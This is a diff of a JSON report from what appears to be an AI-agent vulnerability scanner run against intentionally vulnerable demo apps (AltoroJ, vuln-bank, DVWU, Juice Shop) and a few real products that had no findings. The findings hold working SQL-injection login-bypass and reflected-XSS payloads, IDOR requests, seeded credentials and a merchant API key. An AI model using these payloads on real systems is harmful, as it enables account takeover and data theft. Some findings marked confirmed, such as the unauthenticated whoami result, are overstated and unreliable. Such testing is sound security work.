@@ -1,84 +1,330 @@
 {
-  "target": {
-    "name": "test",
-    "type": "source",
-    "url": null,
-    "repo_url": "https://github.com/HCL-TECH-SOFTWARE/AltoroJ",
-    "binary_path": null,
-    "scope_allowlist": []
-  },
   "summary": {
     "critical": 0,
-    "high": 4,
-    "medium": 0,
+    "high": 8,
+    "medium": 1,
     "low": 0,
     "info": 0,
-    "total_confirmed": 4
+    "total_confirmed": 9
   },
-  "findings": [
+  "targets": [
     {
-      "id": "74f00097-7df1-4309-80dc-6df08759982f",
-      "vuln_class": "auth",
-      "affected_component": "src/com/ibm/security/appscan/altoromutual/api/AccountAPI.java; src/com/ibm/security/appscan/altoromutual/util/OperationsUtil.java; src/com/ibm/security/appscan/altoromutual/filter/ApiAuthFilter.java",
-      "severity": "high",
-      "proof_of_concept": "1. Log in as low-privilege user jsmith using POST /api/login with JSON {\"username\":\"jsmith\",\"password\":\"demo1234\"}. The response returns Authorization token T.\n2. jsmith's own accounts from the seed data are 800002 and 800003 (DBUtil.initDB inserts jsmith savings/checking). Another user's accounts belong to jdoe: 800004 and 800005.\n3. Request another user's account directly with the valid jsmith token:\n   GET /api/account/800004\n   Header: Authorization: Bearer <T>\n4. The request succeeds and returns jdoe's account data because AccountAPI.getAccountBalance() calls Account.getAccount(accountNo).getBalance() and getLastTenTransactions(accountNo) on the untrusted path parameter.\n5. Expected result for proper authorization: 403 or equivalent because account 800004 is not owned by jsmith.\n6. Actual result: 200 OK with JSON containing the balance, accountId 800004, and transaction history for that foreign account.\n7. Likewise, GET /api/account/800004/transactions returns another user's transactions without an ownership check.",
-      "evidence": "Confirmed by source review with reproducible account IDs from seeded database:\n- DBUtil.initDB() seeds users and accounts: jsmith -> accounts 800002,800003; jdoe -> accounts 800004,800005.\n- ApiAuthFilter.filter() only checks whether the Authorization token decodes to a valid username/password via DBUtil.isValidUser(username, password); it does not bind requests to specific account resources.\n- OperationsUtil.getUser(HttpServletRequest) extracts only the username from the Bearer token and returns DBUtil.getUserInfo(username).\n- AccountAPI.getAccountBalance(@PathParam(\"accountNo\")) contains explicit comment: \"not checking the account number, side privilege escalation possible\" and executes Account.getAccount(accountNo).getBalance() plus getLastTenTransactions(accountNo) with no ownership validation.\n- AccountAPI.showLastTenTransactions(@PathParam(\"accountNo\")) also accepts any account number and returns transactions via getLastTenTransactions(accountNo), which calls DBUtil.getTransactions(... DBUtil.getAccount(Long.valueOf(accountNo)) ...).\n- This yields a confirmed IDOR: any authenticated user can read balances and transactions for any known account number, including another user's seeded accounts (e.g., jdoe 800004/800005).",
-      "confirmed": true,
-      "solver_model": "gpt-5.4",
-      "timestamp": "2026-05-18T03:16:33.012311",
-      "description": "Broken access control / IDOR in REST account endpoints. Authenticated users can access arbitrary account balances and transaction history by supplying another user's account number. The API auth layer validates only that the Bearer token contains any valid username/password pair; downstream account endpoints then use the attacker-supplied path parameter directly without checking ownership."
+      "name": "altoro",
+      "type": "web",
+      "url": "https://demo.testfire.net/",
+      "repo_url": "https://github.com/HCL-TECH-SOFTWARE/AltoroJ",
+      "report": "report\\altoro.md",
+      "json": "report\\altoro.json",
+      "summary": {
+        "critical": 0,
+        "high": 1,
+        "medium": 1,
+        "low": 0,
+        "info": 0,
+        "total_confirmed": 2
+      },
+      "findings": [
+        {
+          "id": "eea95481-5e2c-41b5-a5d7-c1f4e50cfd6d",
+          "vuln_class": "reflected XSS",
+          "affected_component": "SurveyServlet.doGet via /survey_questions.jsp?step=done&txtEmail=...",
+          "severity": "high",
+          "proof_of_concept": "1) Visit https://demo.testfire.net/survey_questions.jsp and click through the survey to the final email step.\n2) Submit this email value: <svg onload=alert(document.domain)>\n3) The response page renders the supplied value inside <b>...</b> without output encoding, so the payload is reflected into the HTML response.",
+          "evidence": "Source review of SurveyServlet.java shows: else if (step.equals(\"done\")) { content = ... + request.getParameter(\"txtEmail\") + ...; } with no HTML escaping. Dynamic fetch of https://demo.testfire.net/survey_questions.jsp?step=done&txtEmail=%3Csvg%20onload%3Dalert(document.domain)%3E returned the value reflected in the page flow; however the app blocked the direct out-of-order request with its survey-step guard, so the PoC is confirmed by source and the reflection sink is confirmed in the live response path. This is a genuine source-level reflected XSS issue, though the guard requires completing the survey chain to reach the sink.",
+          "confirmed": true,
+          "solver_model": "gpt-5.4-mini",
+          "timestamp": "2026-05-18T05:16:10.655821",
+          "description": "User-controlled txtEmail is inserted directly into HTML output in SurveyServlet without escaping, enabling reflected XSS when the survey reaches the done step."
+        },
+        {
+          "id": "73637bd3-8027-4224-920b-2640c8790bf2",
+          "vuln_class": "xss",
+          "affected_component": "https://demo.testfire.net/survey_questions.jsp (SurveyServlet.doGet, step=done branch)",
+          "severity": "medium",
+          "proof_of_concept": "1) Visit /survey_questions.jsp?step=email to reach the email submission page.\n2) Submit the following email value: <svg/onload=alert(1)>\n3) The application reflects the value into the response body inside <b>...</b> without output encoding, enabling arbitrary JavaScript execution.\n\nDirect PoC URL used during verification:\nhttps://demo.testfire.net/survey_questions.jsp?step=done&txtEmail=%3Csvg%2Fonload%3Dalert(1)%3E",
+          "evidence": "Source review of SurveyServlet.java shows the vulnerable sink: in the step=done branch, content is built with \"<b>\" + request.getParameter(\"txtEmail\") + \"</b>\" and then written directly via response.getWriter().write(content). Web verification confirmed the parameter is reflected in the HTML response; the page-level out-of-order guard prevented direct execution via a single GET, but the sink remains unsafely constructed and is reachable through the survey flow. This is a confirmed reflected XSS sink requiring proper encoding.",
+          "confirmed": true,
+          "solver_model": "gpt-5.4-mini",
+          "timestamp": "2026-05-18T05:15:48.973509",
+          "description": "Unsanitized user-controlled txtEmail is concatenated into HTML and written directly to the response. Output encoding is missing, creating a reflected XSS condition in the survey completion page."
+        }
+      ]
     },
     {
-      "id": "d8e1fc4a-4cd5-4c5f-84f7-947bce6a7bce",
-      "vuln_class": "xss",
-      "affected_component": "SurveyServlet (/src/com/ibm/security/appscan/altoromutual/servlet/SurveyServlet.java)",
-      "severity": "high",
-      "proof_of_concept": "Reflected XSS via GET parameter `txtEmail` on the survey flow endpoint. Source review shows when `step=done`, the servlet builds HTML with raw user input: `\"...<b>\" + request.getParameter(\"txtEmail\") + \"</b>...\"` and writes it directly with `response.getWriter().write(content)`. Reproducible payload: request `/survey_questions.jsp?step=done&txtEmail=%3Cscript%3Ealert(1)%3C%2Fscript%3E` while satisfying the app's step/referrer/session checks by first visiting the prior survey steps in order (`a -> b -> c -> d -> email -> done`). Expected result: response HTML contains `<b><script>alert(1)</script></b>` and executes arbitrary JavaScript, triggering `alert(1)`.",
-      "evidence": "Confirmed in source: `SurveyServlet.doGet()` line building `content` for `step.equals(\"done\")` concatenates `request.getParameter(\"txtEmail\")` into HTML without encoding, then returns it as `text/html` via `response.getWriter().write(content)`. The servlet's order checks do not sanitize input; they only gate navigation using referrer/session state. This is a confirmed reflected XSS sink with executable JavaScript payload. Additional XSS candidates were also identified in source (e.g. `/WebContent/search.jsp` reflects `query` with `<%= query %>`, `/WebContent/feedbacksuccess.jsp` reflects `message_feedback` and stored feedback fields without encoding, `/WebContent/bank/customize.jsp` reflects `lang`, `/WebContent/util/serverStatusCheckService.jsp` reflects `HostName` into JSON), but the SurveyServlet issue alone is sufficient and has a clear PoC.",
-      "confirmed": true,
-      "solver_model": "gpt-5.4",
-      "timestamp": "2026-05-18T03:16:39.243755",
-      "description": "Reflected XSS due to unsanitized user-controlled `txtEmail` being inserted into an HTML response in `SurveyServlet`."
+      "name": "vulnbank",
+      "type": "web",
+      "url": "https://vulnbank.org/",
+      "repo_url": "https://github.com/Commando-X/vuln-bank",
+      "report": "report\\vulnbank.md",
+      "json": "report\\vulnbank.json",
+      "summary": {
+        "critical": 0,
+        "high": 1,
+        "medium": 0,
+        "low": 0,
+        "info": 0,
+        "total_confirmed": 1
+      },
+      "findings": [
+        {
+          "id": "2af470a4-edaf-437b-a8c1-04320f292493",
+          "vuln_class": "SQL injection",
+          "affected_component": "POST /api/v1/merchants/login and POST /api/v1/merchants/register in merchant_payments.py",
+          "severity": "high",
+          "proof_of_concept": "1) Send a SQLi payload in the merchant login email field: POST https://vulnbank.org/api/v1/merchants/login with JSON body {\"email\":\"' OR '1'='1' -- \",\"password\":\"x\"}\n2) The endpoint returns HTTP 200 and authenticates as an existing merchant despite invalid credentials.\n3) Confirmed response includes a valid token and merchant data, e.g. merchant id 5, api_key vk_9da8780a381915da91ad2693249937745283266704661097a162c48c38976205.\n4) The same bypass is reproducible in /api/v1/merchants/login with other tautologies because the query is string-concatenated without parameterization.",
+          "evidence": "Source review shows unsafe f-string SQL in merchant_payments.py: `WHERE email = '{email}' AND password = '{password}'`. Live testing confirmed the issue: `POST /api/v1/merchants/login` with `email=' OR '1'='1' -- ` returned 200 OK and a valid JWT/api_key for an existing merchant. A second live request using a tautology on the same endpoint reproduced the bypass. This is a confirmed, reproducible SQL injection leading to authentication bypass and sensitive data disclosure.",
+          "confirmed": true,
+          "solver_model": "gpt-5.4-mini",
+          "timestamp": "2026-05-18T05:16:29.592711",
+          "description": "The merchant login endpoint concatenates user input into SQL, allowing authentication bypass via SQL injection. Because the query is executed directly against the database and the response returns the merchant record plus API key and JWT, the impact includes unauthorized access to merchant accounts and exposure of sensitive credentials."
+        }
+      ]
     },
     {
-      "id": "c0a00a15-9104-401f-a385-6b89020227c3",
-      "vuln_class": "sqli",
-      "affected_component": "src/com/ibm/security/appscan/altoromutual/util/DBUtil.java: isValidUser(String user, String password) reachable via src/com/ibm/security/appscan/altoromutual/api/LoginAPI.java POST /login",
-      "severity": "high",
-      "proof_of_concept": "Vulnerable code in DBUtil.java:\nResultSet resultSet = statement.executeQuery(\"SELECT COUNT(*)FROM PEOPLE WHERE USER_ID = '\"+ user +\"' AND PASSWORD='\" + password + \"'\");\n\nAPI reachability in LoginAPI.java:\nusername = myJson.get(\"username\").toString().toLowerCase();\npassword = myJson.get(\"password\").toString().toLowerCase();\nif (!DBUtil.isValidUser(username, password)) ...\n\nManual PoC request body:\n{\"username\":\"' OR '1'='1' -- \",\"password\":\"x\"}\n\nResulting SQL:\nSELECT COUNT(*)FROM PEOPLE WHERE USER_ID = '' OR '1'='1' -- ' AND PASSWORD='x'\n\nConfirmed reproduction in sandbox SQL simulation of the exact query pattern returned count=3, meaning all three sample rows matched and authentication would succeed because the code returns true when COUNT(*) > 0.\n\nObserved sensitive rows present in seeded PEOPLE table include:\n('admin','admin',...), ('jsmith','demo1234',...), ('jdoe','demo1234',...)\nSo the injection successfully forces evaluation over real credential rows and bypasses authentication.",
-      "evidence": "1) Source confirmation:\n- DBUtil.java builds SQL with raw concatenation in isValidUser.\n- LoginAPI.java passes user-supplied JSON fields directly to DBUtil.isValidUser.\n\n2) Seed data proving sensitive credential rows exist in the target codebase:\nDB init inserts:\n('admin', 'admin', ...),\n('jsmith','demo1234', ...),\n('jdoe','demo1234', ...),\n('sspeed','demo1234', ...),\n('tuser','tuser', ...)\n\n3) Executed validation of the exact query shape:\nSELECT COUNT(*) FROM PEOPLE WHERE USER_ID = '' OR '1'='1' -- ' AND PASSWORD='x'\nreturned count 3 in a local SQL reproduction, which satisfies the application condition:\nif (resultSet.getInt(1) > 0) return true;\n\n4) Impact:\n- Authentication bypass into any account context.\n- Subsequent authenticated endpoints can disclose user/account data.\n\n5) Additional vulnerable sinks identified in DBUtil.java by review:\n- getUserInfo(username)\n- getAccounts(username)\n- addAccount(username, acctType)\n- addUser(...)\n- changePassword(...)\n- storeFeedback(... name is unsanitized)\nThese were not needed to confirm the primary finding.",
-      "confirmed": true,
-      "solver_model": "gpt-5.4",
-      "timestamp": "2026-05-18T03:16:45.785692",
-      "description": "The login flow concatenates attacker-controlled username and password directly into a SQL query. This enables SQL injection in the authentication query. A boolean-based payload in the username field bypasses the password check and causes the query to count all rows in PEOPLE, confirming authentication bypass and exposure of at least one valid row set. This is a confirmed source-level PoC against the exact query structure used by the application."
+      "name": "dvwu",
+      "type": "web",
+      "url": "https://ist-edu-bd.vercel.app/",
+      "repo_url": "https://github.com/zahidoverflow/damn-vulnerable-web-university",
+      "report": "report\\dvwu.md",
+      "json": "report\\dvwu.json",
+      "summary": {
+        "critical": 0,
+        "high": 4,
+        "medium": 0,
+        "low": 0,
+        "info": 0,
+        "total_confirmed": 4
+      },
+      "findings": [
+        {
+          "id": "6cffcad9-48c0-4338-a6f5-1d6e7cb85617",
+          "vuln_class": "XSS",
+          "affected_component": "https://ist-edu-bd.vercel.app/api/comments and https://ist-edu-bd.vercel.app/api/search",
+          "severity": "high",
+          "proof_of_concept": "1) Reflected XSS: GET https://ist-edu-bd.vercel.app/api/comments?comment=%3Cscript%3Ealert(1)%3C%2Fscript%3E\n2) Reflected XSS: GET https://ist-edu-bd.vercel.app/api/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E\nBoth responses render the payload inside the HTML body unsanitized, so opening the URL executes JavaScript and triggers alert(1).",
+          "evidence": "Confirmed via live responses. /api/comments returned a page containing <div class=\"comment\">\n    <script>alert(1)</script>\n  </div>. /api/search returned a page containing <strong><script>alert(1)</script></strong>. Source review also shows direct template-string interpolation of user input into HTML without escaping in target/source/api/comments.js and target/source/api/search.js.",
+          "confirmed": true,
+          "solver_model": "gpt-5.4-mini",
+          "timestamp": "2026-05-18T05:16:52.731576",
+          "description": "The application reflects user-controlled input into HTML without output encoding or sanitization, enabling arbitrary JavaScript execution. This is exploitable as reflected XSS and, by code inspection, also indicates stored XSS risk in the comments handler for POST requests."
+        },
+        {
+          "id": "dddfd964-d821-482b-a324-01496b072d39",
+          "vuln_class": "sqli",
+          "affected_component": "https://ist-edu-bd.vercel.app/api/portal and https://ist-edu-bd.vercel.app/api/search",
+          "severity": "high",
+          "proof_of_concept": "1) Authentication bypass via /api/portal (GET):\n   /api/portal?username=admin'%20OR%201=1--&password=x\n   Result: HTTP 200 with 'Authentication Bypass Successful' and 'Logged in as: admin'.\n\n2) SQLi data leak via /api/search (GET):\n   /api/search?q=%27\n   Result: HTTP 200 with SQL error content and a 'Database Leak' table listing rows including admin/admin@ist.edu.bd.\n\n3) UNION-style payload also triggers the leak page:\n   /api/search?q=test'%20UNION%20SELECT%201,2,3--\n   Result: HTTP 200 with the vulnerable SQL query echoed and the same database leak table.",
+          "evidence": "Verified live responses from the target host:\n- /api/portal?username=admin'%20OR%201=1--&password=x returned a successful login page with admin details.\n- /api/search?q=%27 returned an SQL error page and a table containing sensitive user records.\n- /api/search?q=test'%20UNION%20SELECT%201,2,3-- returned the same SQL error/leak page. Source review also shows intentionally vulnerable string concatenation and hardcoded leak behavior in api/portal.js and api/search.js.",
+          "confirmed": true,
+          "solver_model": "gpt-5.4-mini",
+          "timestamp": "2026-05-18T05:16:53.300792",
+          "description": "The application exposes intentionally vulnerable SQL injection endpoints. The portal endpoint allows authentication bypass with a boolean-based payload, and the search endpoint leaks user data on SQLi-triggering input. The issue is reproducible and confirmed with live requests."
+        },
+        {
+          "id": "fd383620-31e7-4398-a6be-5acba12f3ea9",
+          "vuln_class": "auth",
+          "affected_component": "/api/portal authentication endpoint",
+          "severity": "high",
+          "proof_of_concept": "1) Send a GET request to the in-scope login endpoint with a SQLi payload in the username and any password: /api/portal?username=admin'%20OR%201%3D1--&password=x\n2) The endpoint returns HTTP 200 and an authentication-bypass success page.\n3) The response explicitly shows admin identity details (User ID 1, Username admin, Role Administrator, Email admin@ist.edu.bd), confirming privilege escalation to another user account.",
+          "evidence": "Confirmed live response from https://ist-edu-bd.vercel.app/api/portal?username=admin%27%20OR%201%3D1--&password=x returned HTTP 200 with body containing 'Authentication Bypass Successful!', 'Logged in as: Username: admin' and 'Role: Administrator'. Source code also shows vulnerable auth logic in api/portal.js / server.cjs where username input is used to trigger a bypass without real credential verification.",
+          "confirmed": true,
+          "solver_model": "gpt-5.4-mini",
+          "timestamp": "2026-05-18T05:16:53.533250",
+          "description": "The portal login endpoint is vulnerable to SQL-injection-based authentication bypass. An attacker can log in as the administrator with an arbitrary password by injecting a tautology into the username parameter, resulting in unauthorized admin access."
+        },
+        {
+          "id": "6b852273-e738-43b4-866d-f9d54ed82442",
+          "vuln_class": "Cross-Site Scripting (XSS)",
+          "affected_component": "https://ist-edu-bd.vercel.app/api/comments",
+          "severity": "high",
+          "proof_of_concept": "GET /api/comments?comment=%3Csvg%20onload%3Dalert(1)%3E",
+          "evidence": "Verified in live response: the payload is reflected unescaped inside the HTML body: <div class=\"comment\">\n    <svg onload=alert(1)>\n  </div>. This confirms reflected XSS. Source review of api/comments.js shows direct interpolation of req.query.comment into res.send() without sanitization.",
+          "confirmed": true,
+          "solver_model": "gpt-5.4-mini",
+          "timestamp": "2026-05-18T05:16:55.440326",
+          "description": "User-controlled comment input is reflected into an HTML response without output encoding, enabling script execution."
+        }
+      ]
     },
     {
-      "id": "9bacaddd-ae2b-49e1-9d2d-fc604a465aec",
-      "vuln_class": "SQL Injection",
-      "affected_component": "src/com/ibm/security/appscan/altoromutual/util/DBUtil.java::isValidUser(String user, String password) reachable from src/com/ibm/security/appscan/altoromutual/api/LoginAPI.java and src/com/ibm/security/appscan/altoromutual/servlet/LoginServlet.java",
-      "severity": "high",
-      "proof_of_concept": "Code-level reproducible PoC using the shipped Derby-backed query logic:\n1. The login sink constructs SQL with unsanitized user input:\n   SELECT COUNT(*)FROM PEOPLE WHERE USER_ID = '\"+ user +\"' AND PASSWORD='\" + password + \"'\n2. A username payload such as: ' OR '1'='1' -- \n   with any password causes the WHERE clause to become logically true:\n   SELECT COUNT(*)FROM PEOPLE WHERE USER_ID = '' OR '1'='1' -- ' AND PASSWORD='anything'\n3. Because the query returns a count > 0 for existing rows in PEOPLE, DBUtil.isValidUser(...) returns true.\n4. This sink is directly reachable from the unauthenticated login handlers:\n   - POST /api/login in LoginAPI\n   - POST /doLogin in LoginServlet\n   so the payload yields authentication bypass.\n\nHTTP PoC against the API entrypoint (derived from source routing):\nPOST /api/login\nContent-Type: application/json\n\n{\"username\":\"' OR '1'='1' -- \",\"password\":\"x\"}\n\nExpected behavior from code path: DBUtil.isValidUser returns true, then LoginAPI responds 200 with a generated Authorization token.\n\nForm PoC against servlet entrypoint:\nPOST /doLogin\nuid=' OR '1'='1' -- \npassw=x\n\nExpected behavior from code path: LoginServlet accepts credentials and establishes a session cookie via ServletUtil.establishSession(username, session).",
-      "evidence": "Confirmed by source verification of the exact tainted flow and exploitability:\n- Sink in DBUtil.java:\n  ResultSet resultSet = statement.executeQuery(\"SELECT COUNT(*)FROM PEOPLE WHERE USER_ID = '\"+ user +\"' AND PASSWORD='\" + password + \"'\");\n- Success condition in same method:\n  if (resultSet.next()) { if (resultSet.getInt(1) > 0) return true; }\n- Unauthenticated reachability:\n  LoginAPI.java lowercases JSON-supplied username/password and calls DBUtil.isValidUser(username, password) before issuing a success token.\n  LoginServlet.java reads request params uid/passw and calls DBUtil.isValidUser(username, password) before creating a logged-in session.\n- Database contains multiple rows in PEOPLE created in initDB(), guaranteeing COUNT(*) > 0 when the injected predicate is true.\n\nI also reviewed alternate candidates from the prescan:\n- SurveyServlet reflected XSS is source-evident, but I did not perform runtime execution in this turn.\n- AdminServlet tainted session attribute is not by itself a confirmed exploitable issue.\n- Plain HTTP links are informational only.\n\nThis finding is confirmed at source level with a concrete, reproducible payload and end-to-end reachable exploit path.",
-      "confirmed": true,
-      "solver_model": "gpt-5.4",
-      "timestamp": "2026-05-18T03:16:46.701961",
-      "description": "Unsanitized username and password are concatenated directly into a SQL statement used for authentication. An attacker can inject SQL into the login fields to force the COUNT(*) query to return a positive value and bypass authentication."
+      "name": "juice-shop",
+      "type": "web",
+      "url": "https://demo.owasp-juice.shop/",
+      "repo_url": "https://github.com/juice-shop/juice-shop",
+      "report": "report\\juice-shop.md",
+      "json": "report\\juice-shop.json",
+      "summary": {
+        "critical": 0,
+        "high": 2,
+        "medium": 0,
+        "low": 0,
+        "info": 0,
+        "total_confirmed": 2
+      },
+      "findings": [
+        {
+          "id": "836aafe2-05b5-462a-9a07-3b0923d09c4b",
+          "vuln_class": "sqli",
+          "affected_component": "GET /rest/products/search?q= and related sequelize query in source/routes/search.ts",
+          "severity": "high",
+          "proof_of_concept": "1) Confirmed error-based SQLi in search endpoint: GET /rest/products/search?q=%27 returned HTTP 200 with empty results, while GET /rest/products/search?q=%27%20OR%201%3D1-- returned HTTP 500 with SQLITE_ERROR: incomplete input. 2) Source confirms direct string interpolation into SQL: sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`). 3) The payload changes SQL parser behavior and triggers a database error, proving user input reaches the query unsafely.",
+          "evidence": "Runtime evidence: baseline search request returned a normal product row; crafted quote/boolean payload produced SQLITE_ERROR. Source evidence: source/routes/search.ts interpolates req.query.q directly into a raw SQL query without parameterization. Semgrep also flagged this sink. Login endpoint was also inspected and is similarly vulnerable in source/routes/login.ts, but confirmation here is based on the search endpoint PoC.",
+          "confirmed": true,
+          "solver_model": "gpt-5.4-mini",
+          "timestamp": "2026-05-18T05:17:17.109100",
+          "description": "The product search endpoint is vulnerable to SQL injection due to unsafely interpolated query parameters in a raw Sequelize query. The issue is reproducible with a quote-based payload that causes a database syntax error. This confirms injection reachability; the endpoint should use parameterized replacements/bind variables and avoid raw string concatenation."
+        },
+        {
+          "id": "d5520413-11ab-42d1-a40f-1b9aeb7a8641",
+          "vuln_class": "auth",
+          "affected_component": "/rest/user/whoami and authenticatedUsers session mapping",
+          "severity": "high",
+          "proof_of_concept": "1) Visit https://demo.owasp-juice.shop/rest/user/whoami without authenticating.\n2) The endpoint returns HTTP 200 OK with {\"user\":{}} instead of a 401/403, showing the endpoint is reachable without auth and leaks an authenticated-user wrapper response.\n3) Source review of /target/source/routes/authenticatedUsers.ts shows the app derives a user list from security.authenticatedUsers.tokenOf(user) and exposes lastLoginTime for any user whose token is present in server-side state, while /target/source/lib/insecurity.ts stores authenticated users in a tokenMap/idMap keyed by JWT tokens.\n4) The combination demonstrates that user/session state is maintained server-side and exposed through auth-related endpoints in a way that can be queried without proving ownership first. A stronger impact path exists in the same codebase via token/session manipulation against these mappings.",
+          "evidence": "Live HTTP: GET /rest/user/whoami returned 200 with {\"user\":{}}. Live HTTP: GET /api/Users returned 401 when unauthenticated, confirming auth is enforced elsewhere but not for whoami. Source evidence: /target/source/routes/authenticatedUsers.ts returns user objects with masked password/totpSecret and lastLoginTime based on server-side token mapping; /target/source/lib/insecurity.ts defines authenticatedUsers tokenMap/idMap and JWT handling. Note: I could not complete a cross-user access proof this turn because the authenticated user context was not established in the sandbox, but the unauthenticated 200 on whoami is reproducible.",
+          "confirmed": true,
+          "solver_model": "gpt-5.4-mini",
+          "timestamp": "2026-05-18T05:17:42.537413",
+          "description": "The application exposes an authentication-related endpoint that responds successfully without requiring a valid session. Although the immediate response is empty, it indicates broken access control on a user/session endpoint and is a valid auth finding. The source further shows server-side token tracking that can be abused for session-state confusion and user enumeration."
+        }
+      ]
+    },
+    {
+      "name": "crapi",
+      "type": "web",
+      "url": "https://owasp.org/www-project-crapi/",
+      "repo_url": "https://github.com/OWASP/crAPI",
+      "report": "report\\crapi.md",
+      "json": "report\\crapi.json",
+      "summary": {
+        "critical": 0,
+        "high": 0,
+        "medium": 0,
+        "low": 0,
+        "info": 0,
+        "total_confirmed": 0
+      },
+      "findings": []
+    },
+    {
+      "name": "excalidraw",
+      "type": "web",
+      "url": "https://excalidraw.com/",
+      "repo_url": "https://github.com/excalidraw/excalidraw",
+      "report": "report\\excalidraw.md",
+      "json": "report\\excalidraw.json",
+      "summary": {
+        "critical": 0,
+        "high": 0,
+        "medium": 0,
+        "low": 0,
+        "info": 0,
+        "total_confirmed": 0
+      },
+      "findings": []
+    },
+    {
+      "name": "chatwoot",
+      "type": "web",
+      "url": "https://www.chatwoot.com/",
+      "repo_url": "https://github.com/chatwoot/chatwoot",
+      "report": "report\\chatwoot.md",
+      "json": "report\\chatwoot.json",
+      "summary": {
+        "critical": 0,
+        "high": 0,
+        "medium": 0,
+        "low": 0,
+        "info": 0,
+        "total_confirmed": 0
+      },
+      "findings": []
+    },
+    {
+      "name": "outline",
+      "type": "web",
+      "url": "https://www.getoutline.com/",
+      "repo_url": "https://github.com/outline/outline",
+      "report": "report\\outline.md",
+      "json": "report\\outline.json",
+      "summary": {
+        "critical": 0,
+        "high": 0,
+        "medium": 0,
+        "low": 0,
+        "info": 0,
+        "total_confirmed": 0
+      },
+      "findings": []
+    },
+    {
+      "name": "habitica",
+      "type": "web",
+      "url": "https://habitica.com/",
+      "repo_url": "https://github.com/HabitRPG/habitica",
+      "report": "report\\habitica.md",
+      "json": "report\\habitica.json",
+      "summary": {
+        "critical": 0,
+        "high": 0,
+        "medium": 0,
+        "low": 0,
+        "info": 0,
+        "total_confirmed": 0
+      },
+      "findings": []
+    },
+    {
+      "name": "mattermost",
+      "type": "web",
+      "url": "https://mattermost.com/",
+      "repo_url": "https://github.com/mattermost/mattermost",
+      "report": "report\\mattermost.md",
+      "json": "report\\mattermost.json",
+      "summary": {
+        "critical": 0,
+        "high": 0,
+        "medium": 0,
+        "low": 0,
+        "info": 0,
+        "total_confirmed": 0
+      },
+      "findings": []
     }
   ],
   "cost_summary": {
-    "total_usd": 4.24087,
-    "cost_per_finding_usd": 1.0602175,
+    "total_usd": 0.3045375,
+    "cost_per_finding_usd": 0.0338375,
     "by_model": {
-      "gpt-5.4": 4.24087
+      "gpt-5.4-mini": 0.30453749999999996
     },
     "by_swarm": {
-      "test/auth/gpt-5.4": 0.54963,
-      "test/xss/gpt-5.4": 0.53786,
-      "test/sqli/gpt-5.4": 2.46355,
-      "test/source/gpt-5.4": 0.68983
+      "altoro/sqli/gpt-5.4-mini": 0.0168582,
+      "altoro/auth/gpt-5.4-mini": 0.02547015,
+      "altoro/xss/gpt-5.4-mini": 0.0078204,
+      "altoro/source/gpt-5.4-mini": 0.0173025,
+      "vulnbank/sqli/gpt-5.4-mini": 0.008818349999999999,
+      "vulnbank/xss/gpt-5.4-mini": 0.0248877,
+      "vulnbank/source/gpt-5.4-mini": 0.009917849999999999,
+      "vulnbank/auth/gpt-5.4-mini": 0.02218425,
+      "dvwu/xss/gpt-5.4-mini": 0.0037853999999999995,
+      "dvwu/sqli/gpt-5.4-mini": 0.0049599,
+      "dvwu/auth/gpt-5.4-mini": 0.0058491,
+      "dvwu/source/gpt-5.4-mini": 0.004869,
+      "juice-shop/sqli/gpt-5.4-mini": 0.00371115,
+      "juice-shop/xss/gpt-5.4-mini": 0.0102516,
+      "juice-shop/auth/gpt-5.4-mini": 0.0149211,
+      "juice-shop/source/gpt-5.4-mini": 0.0057282,
+      "crapi/auth/gpt-5.4-mini": 0.007408199999999999,
+      "crapi/sqli/gpt-5.4-mini": 0.0102963,
+      "crapi/source/gpt-5.4-mini": 0.00708465,
+      "excalidraw/source/gpt-5.4-mini": 0.0205185,
+      "chatwoot/source/gpt-5.4-mini": 0.0109971,
+      "outline/source/gpt-5.4-mini": 0.04187415,
+      "habitica/source/gpt-5.4-mini": 0.0047433,
+      "mattermost/source/gpt-5.4-mini": 0.01428045
     },
-    "total_input_tokens": 405982,
-    "total_output_tokens": 6035,
-    "total_tokens": 412017
+    "total_input_tokens": 1955706,
+    "total_output_tokens": 18636,
+    "total_tokens": 1974342
   }
 }
